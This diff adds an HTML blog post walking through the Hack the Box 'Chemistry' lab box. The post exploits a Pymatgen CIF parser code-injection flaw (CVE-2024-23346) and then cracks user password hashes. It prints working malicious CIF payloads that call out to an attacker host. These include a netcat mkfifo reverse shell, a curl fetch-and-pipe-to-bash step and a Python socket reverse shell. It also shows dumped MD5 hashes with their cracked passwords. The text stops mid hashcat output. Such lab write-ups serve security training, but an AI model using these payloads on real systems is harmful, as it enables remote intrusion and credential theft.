@@ -1,0 +1,508 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Hack the Box - Chemistry (Easy) Walkthrough</title>
+<link rel=stylesheet href=/style.css><style>.navbar-container{display:flex;flex-direction:column;align-items:center;margin-bottom:2rem}.logo-full{display:block;margin:2rem auto .5rem;max-width:720px;height:256px;object-fit:contain}nav.navbar{display:flex;justify-content:center;align-items:center;gap:2.5rem;margin-bottom:1.5rem}.navbar-link{color:#eaeaea;font-size:1.1rem;text-decoration:none;font-weight:500;display:flex;align-items:center;transition:color .2s}.navbar-link:hover{color:#6ec1e4}.navbar-logo-text{height:2.2rem;width:auto;display:block}@media(max-width:600px){.logo-full{max-width:120px;height:40px}nav.navbar{gap:1.2rem}.navbar-logo-text{height:1.3rem}}</style></head><body><div class=navbar-container><a href=/><img src=/logofull.png alt="gentlem00se full logo" class=logo-full></a><nav class=navbar><a href=/ class=navbar-link>Home</a>
+<a href=/categories/ class=navbar-link>Categories</a>
+<a href=/about/ class=navbar-link>About</a></nav></div><div class=center-container><article class=post-article><h1>Hack the Box - Chemistry (Easy) Walkthrough</h1><div class=post-date>Jul 7, 2025</div><nav class=post-toc><nav id=TableOfContents><ul><li><ul><li><a href=#box-info>Box Info</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#getting-user>Getting User</a></li><li><a href=#getting-root>Getting Root</a></li><li><a href=#closing-the-vulnerability>Closing the Vulnerability</a></li><li><a href=#key-penetration-testing-takeaways>Key Penetration Testing Takeaways</a></li></ul></li></ul></nav></nav><div class=post-content><h3 id=box-info>Box Info</h3><p><strong>Box Name:</strong> Chemistry<br><strong>Listed Difficulty Rating:</strong> Easy<br><strong>chasepd&rsquo;s Difficulty Rating:</strong> Easy<br><strong>Release Date:</strong> 2024<br><strong>Tech Stack:</strong> Pymatgen CIF Parser, sqlite, aiohttp<br><strong>Skills Learned:</strong> Default credentials, code injection, exploiting CVEs</p><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/chemistry-htb-walkthrough/Chemistry.png alt="Chemistry HTB Walkthrough" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><h3 id=foothold>Foothold</h3><p>Initial nmap scan:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ nmap -oN nmapscan -A chemistry
+</span></span><span style=display:flex><span>Starting Nmap 7.95 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2025-07-06 21:37 MDT
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> chemistry <span style=color:#f92672>(</span>10.129.231.170<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.065s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey:
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>5000/tcp open  http    Werkzeug httpd 3.0.3 <span style=color:#f92672>(</span>Python 3.9.5<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
+</span></span><span style=display:flex><span>|_http-title: Chemistry - Home
+</span></span><span style=display:flex><span>Device type: general purpose|router
+</span></span><span style=display:flex><span>Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+</span></span><span style=display:flex><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+</span></span><span style=display:flex><span>OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 <span style=color:#f92672>(</span>Linux 5.6.3<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 80/tcp<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>HOP RTT      ADDRESS
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   67.40 ms 10.10.14.1
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   67.53 ms chemistry <span style=color:#f92672>(</span>10.129.231.170<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 12.18 seconds
+</span></span></code></pre></div><p>Navigating to the web service, we see there is a &ldquo;Chemistry CIF Analyzer&rdquo; service:</p><figure style=display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%><img src=/posts/chemistry-htb-walkthrough/website.png alt="Website screenshot" loading=lazy style="max-width:100%;height:auto;display:block;margin:0 auto"></figure><p>Well, it has a register functionality, so we might as well. We register with the credentials chasepd:chasepd.</p><p>Here we find a dashboard for uploading CIF files. They have helpfully provided an example CIF for us:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ cat example.cif
+</span></span><span style=display:flex><span>data_Example
+</span></span><span style=display:flex><span>_cell_length_a    10.00000
+</span></span><span style=display:flex><span>_cell_length_b    10.00000
+</span></span><span style=display:flex><span>_cell_length_c    10.00000
+</span></span><span style=display:flex><span>_cell_angle_alpha 90.00000
+</span></span><span style=display:flex><span>_cell_angle_beta  90.00000
+</span></span><span style=display:flex><span>_cell_angle_gamma 90.00000
+</span></span><span style=display:flex><span>_symmetry_space_group_name_H-M <span style=color:#e6db74>&#39;P 1&#39;</span>
+</span></span><span style=display:flex><span>loop_
+</span></span><span style=display:flex><span> _atom_site_label
+</span></span><span style=display:flex><span> _atom_site_fract_x
+</span></span><span style=display:flex><span> _atom_site_fract_y
+</span></span><span style=display:flex><span> _atom_site_fract_z
+</span></span><span style=display:flex><span> _atom_site_occupancy
+</span></span><span style=display:flex><span> H 0.00000 0.00000 0.00000 <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span> O 0.50000 0.50000 0.50000 <span style=color:#ae81ff>1</span>
+</span></span></code></pre></div><p>I have no idea what this is but it looks like something for defining molecule structures or something else sciencey. Searching &ldquo;CIF file exploit&rdquo; immediately pops up several articles about a remote code execution vulnerability - <a href=https://github.com/advisories/GHSA-vgv8-5cpj-qj2f>CVE-2024-23346</a>
+<img src=/emojis/excellent.gif alt=excellent class="inline-emoji no-lightbox-emoji"><style>.inline-emoji.no-lightbox-emoji{height:1em;width:auto;vertical-align:-.15em;display:inline-block;margin:0 .08em;background:0 0!important;box-shadow:none!important;border:none!important;padding:0!important}body .inline-emoji.no-lightbox-emoji,body .post-content .inline-emoji.no-lightbox-emoji,body .about-content .inline-emoji.no-lightbox-emoji,body figure .inline-emoji.no-lightbox-emoji{background:0 0!important;box-shadow:none!important;border:none!important;padding:0!important;max-width:none!important}</style>. The Github advisory even has a nice POC:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>data_5yOhtAoR
+</span></span><span style=display:flex><span>_audit_creation_date            2018-06-08
+</span></span><span style=display:flex><span>_audit_creation_method          <span style=color:#e6db74>&#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>loop_
+</span></span><span style=display:flex><span>_parent_propagation_vector.id
+</span></span><span style=display:flex><span>_parent_propagation_vector.kxkykz
+</span></span><span style=display:flex><span>k1 <span style=color:#f92672>[</span><span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> 0<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>_space_group_magn.transform_BNS_Pp_abc  <span style=color:#e6db74>&#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;touch pwned&#34;);0,0,0&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>_space_group_magn.number_BNS  62.448
+</span></span><span style=display:flex><span>_space_group_magn.name_BNS  <span style=color:#e6db74>&#34;P  n&#39;  m  a&#39;  &#34;</span>
+</span></span></code></pre></div><p>That looks excellent, and really easy to exploit. We convert this to execute a reverse shell instead:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>data_5yOhtAoR
+</span></span><span style=display:flex><span>_audit_creation_date            2018-06-08
+</span></span><span style=display:flex><span>_audit_creation_method          <span style=color:#e6db74>&#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>loop_
+</span></span><span style=display:flex><span>_parent_propagation_vector.id
+</span></span><span style=display:flex><span>_parent_propagation_vector.kxkykz
+</span></span><span style=display:flex><span>k1 <span style=color:#f92672>[</span><span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> 0<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>_space_group_magn.transform_BNS_Pp_abc  <span style=color:#e6db74>&#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.245 5555 &gt;/tmp/f&#34;);0,0,0&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>_space_group_magn.number_BNS  62.448
+</span></span><span style=display:flex><span>_space_group_magn.name_BNS  <span style=color:#e6db74>&#34;P  n&#39;  m  a&#39;  &#34;</span>
+</span></span></code></pre></div><p>Then, we start a listener on port 5555 on our attacker machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>5555</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>5555</span> ...
+</span></span></code></pre></div><p>Time to upload the malicious file and see if it works. Perhaps unsurprisingly, it does not. A simpler command might help us determine if it&rsquo;s something wrong with the reverse shell code we wrote, or if the RCE vulnerability is a dud.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>data_5yOhtAoR
+</span></span><span style=display:flex><span>_audit_creation_date            2018-06-08
+</span></span><span style=display:flex><span>_audit_creation_method          <span style=color:#e6db74>&#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>loop_
+</span></span><span style=display:flex><span>_parent_propagation_vector.id
+</span></span><span style=display:flex><span>_parent_propagation_vector.kxkykz
+</span></span><span style=display:flex><span>k1 <span style=color:#f92672>[</span><span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> 0<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>_space_group_magn.transform_BNS_Pp_abc  <span style=color:#e6db74>&#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;curl 10.10.14.245:5555&#34;);0,0,0&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>_space_group_magn.number_BNS  62.448
+</span></span><span style=display:flex><span>_space_group_magn.name_BNS  <span style=color:#e6db74>&#34;P  n&#39;  m  a&#39;  &#34;</span>
+</span></span></code></pre></div><p>This time, it works. We recieve a curl command to our listener:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ nc -lvnp <span style=color:#ae81ff>5555</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>5555</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.14.245<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.129.231.170<span style=color:#f92672>]</span> <span style=color:#ae81ff>44254</span>
+</span></span><span style=display:flex><span>GET / HTTP/1.1
+</span></span><span style=display:flex><span>Host: 10.10.14.245:5555
+</span></span><span style=display:flex><span>User-Agent: curl/7.68.0
+</span></span><span style=display:flex><span>Accept: */*
+</span></span></code></pre></div><p>So we know now that the RCE is working. Let&rsquo;s do something simpler. We&rsquo;ll create a file called revsh.sh:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.245&#34;,5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><p>Then upload this exploit which will curl our hosted file and then feed it to bash:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ cat ex.cif
+</span></span><span style=display:flex><span>data_5yOhtAoR
+</span></span><span style=display:flex><span>_audit_creation_date            2018-06-08
+</span></span><span style=display:flex><span>_audit_creation_method          <span style=color:#e6db74>&#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>loop_
+</span></span><span style=display:flex><span>_parent_propagation_vector.id
+</span></span><span style=display:flex><span>_parent_propagation_vector.kxkykz
+</span></span><span style=display:flex><span>k1 <span style=color:#f92672>[</span><span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> 0<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>_space_group_magn.transform_BNS_Pp_abc  <span style=color:#e6db74>&#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;curl http://10.10.14.245:8000/revsh.sh | /bin/bash&#34;);0,0,0&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>_space_group_magn.number_BNS  62.448
+</span></span><span style=display:flex><span>_space_group_magn.name_BNS  <span style=color:#e6db74>&#34;P  n&#39;  m  a&#39;  &#34;</span>
+</span></span></code></pre></div><p>We start our nc listener again and also use <code>python -m http.server</code> command to start the http server for serving the exploit.</p><p>Sure enough:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ nc -lvnp <span style=color:#ae81ff>5555</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>5555</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.14.245<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.129.231.170<span style=color:#f92672>]</span> <span style=color:#ae81ff>59726</span>
+</span></span><span style=display:flex><span>$
+</span></span></code></pre></div><h3 id=getting-user>Getting User</h3><p>We can upgrade our shell (thanks to <a href=https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#spawn-tty-shell>https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#spawn-tty-shell</a>) and now we&rsquo;re in.</p><p>Looking at /etc/passwd, there&rsquo;s also another user named rosa:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>app@chemistry:~$ cat /etc/passwd
+</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span style=display:flex><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span style=display:flex><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span style=display:flex><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span style=display:flex><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
+</span></span><span style=display:flex><span>fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style=display:flex><span>sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style=display:flex><span>rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
+</span></span><span style=display:flex><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span style=display:flex><span>app:x:1001:1001:,,,:/home/app:/bin/bash
+</span></span><span style=display:flex><span>_laurel:x:997:997::/var/log/laurel:/bin/false
+</span></span></code></pre></div><p>There&rsquo;s also a SQLlite database at /home/app/instance/database.db which has user hashes in it, including one for rosa:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>app@chemistry:~/instance$ sqlite3 database.db
+</span></span><span style=display:flex><span>SQLite version 3.31.1 2020-01-27 19:55:54
+</span></span><span style=display:flex><span>Enter <span style=color:#e6db74>&#34;.help&#34;</span> <span style=color:#66d9ef>for</span> usage hints.
+</span></span><span style=display:flex><span>sqlite&gt; .tables
+</span></span><span style=display:flex><span>structure  user
+</span></span><span style=display:flex><span>sqlite&gt; <span style=color:#66d9ef>select</span> * from user;
+</span></span><span style=display:flex><span>1|admin|2861debaf8d99436a10ed6f75a252abf
+</span></span><span style=display:flex><span>2|app|197865e46b878d9e74a0346b6d59886a
+</span></span><span style=display:flex><span>3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
+</span></span><span style=display:flex><span>4|robert|02fcf7cfc10adc37959fb21f06c6b467
+</span></span><span style=display:flex><span>5|jobert|3dec299e06f7ed187bac06bd3b670ab2
+</span></span><span style=display:flex><span>6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
+</span></span><span style=display:flex><span>7|peter|6845c17d298d95aa942127bdad2ceb9b
+</span></span><span style=display:flex><span>8|victoria|c3601ad2286a4293868ec2a4bc606ba3
+</span></span><span style=display:flex><span>9|tania|a4aa55e816205dc0389591c9f82f43bb
+</span></span><span style=display:flex><span>10|eusebio|6cad48078d0241cca9a7b322ecd073b3
+</span></span><span style=display:flex><span>11|gelacia|4af70c80b68267012ecdac9a7e916d18
+</span></span><span style=display:flex><span>12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
+</span></span><span style=display:flex><span>13|axel|9347f9724ca083b17e39555c36fd9007
+</span></span><span style=display:flex><span>14|kristel|6896ba7b11a62cacffbdaded457c6d92
+</span></span><span style=display:flex><span>15|chasepd|86b073042218c06ecbeec33c23dce684
+</span></span><span style=display:flex><span>sqlite&gt;
+</span></span></code></pre></div><p>Let&rsquo;s crack some of these hashes to get a potential password list to try. We can confirm from the code in /home/app/app.py that these are MD5 hashes.</p><p>We quickly crack 4 of the hashes, including rosa&rsquo;s:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ hashcat -m <span style=color:#ae81ff>0</span> hashes /usr/share/wordlists/rockyou.txt
+</span></span><span style=display:flex><span>hashcat <span style=color:#f92672>(</span>v6.2.6<span style=color:#f92672>)</span> starting
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cuInit<span style=color:#f92672>()</span>: no CUDA-capable device is detected
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OpenCL API <span style=color:#f92672>(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span style=color:#f92672>)</span> - Platform <span style=color:#75715e>#1 [The pocl project]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>====================================================================================================================================================</span>
+</span></span><span style=display:flex><span>* Device <span style=color:#75715e>#1: cpu-skylake-avx512-AMD Ryzen 9 7950X3D 16-Core Processor, 14919/29903 MB (4096 MB allocatable), 32MCU</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Minimum password length supported by kernel: <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>Maximum password length supported by kernel: <span style=color:#ae81ff>256</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Hashes: <span style=color:#ae81ff>14</span> digests; <span style=color:#ae81ff>14</span> unique digests, <span style=color:#ae81ff>1</span> unique salts
+</span></span><span style=display:flex><span>Bitmaps: <span style=color:#ae81ff>16</span> bits, <span style=color:#ae81ff>65536</span> entries, 0x0000ffff mask, <span style=color:#ae81ff>262144</span> bytes, 5/13 rotates
+</span></span><span style=display:flex><span>Rules: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Optimizers applied:
+</span></span><span style=display:flex><span>* Zero-Byte
+</span></span><span style=display:flex><span>* Early-Skip
+</span></span><span style=display:flex><span>* Not-Salted
+</span></span><span style=display:flex><span>* Not-Iterated
+</span></span><span style=display:flex><span>* Single-Salt
+</span></span><span style=display:flex><span>* Raw-Hash
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ATTENTION! Pure <span style=color:#f92672>(</span>unoptimized<span style=color:#f92672>)</span> backend kernels selected.
+</span></span><span style=display:flex><span>Pure kernels can crack longer passwords, but drastically reduce performance.
+</span></span><span style=display:flex><span>If you want to switch to optimized kernels, append -O to your commandline.
+</span></span><span style=display:flex><span>See the above message to find out about the exact limits.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Watchdog: Hardware monitoring interface not found on your system.
+</span></span><span style=display:flex><span>Watchdog: Temperature abort trigger disabled.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host memory required <span style=color:#66d9ef>for</span> this attack: <span style=color:#ae81ff>8</span> MB
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Dictionary cache hit:
+</span></span><span style=display:flex><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style=display:flex><span>* Passwords.: <span style=color:#ae81ff>14344385</span>
+</span></span><span style=display:flex><span>* Bytes.....: <span style=color:#ae81ff>139921507</span>
+</span></span><span style=display:flex><span>* Keyspace..: <span style=color:#ae81ff>14344385</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>9ad48828b0955513f7cf0f7f6510c8f8:carlos123
+</span></span><span style=display:flex><span>6845c17d298d95aa942127bdad2ceb9b:peterparker
+</span></span><span style=display:flex><span>c3601ad2286a4293868ec2a4bc606ba3:victoria123
+</span></span><span style=display:flex><span>63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
+</span></span><span style=display:flex><span>Approaching final keyspace - workload adjusted.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Session..........: hashcat
+</span></span><span style=display:flex><span>Status...........: Exhausted
+</span></span><span style=display:flex><span>Hash.Mode........: <span style=color:#ae81ff>0</span> <span style=color:#f92672>(</span>MD5<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Hash.Target......: hashes
+</span></span><span style=display:flex><span>Time.Started.....: Mon Jul  <span style=color:#ae81ff>7</span> 09:58:23 <span style=color:#ae81ff>2025</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> sec<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Time.Estimated...: Mon Jul  <span style=color:#ae81ff>7</span> 09:58:24 <span style=color:#ae81ff>2025</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>0</span> secs<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Kernel.Feature...: Pure Kernel
+</span></span><span style=display:flex><span>Guess.Base.......: File <span style=color:#f92672>(</span>/usr/share/wordlists/rockyou.txt<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Guess.Queue......: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Speed.#1.........:  9518.1 kH/s <span style=color:#f92672>(</span>0.37ms<span style=color:#f92672>)</span> @ Accel:1024 Loops:1 Thr:1 Vec:16
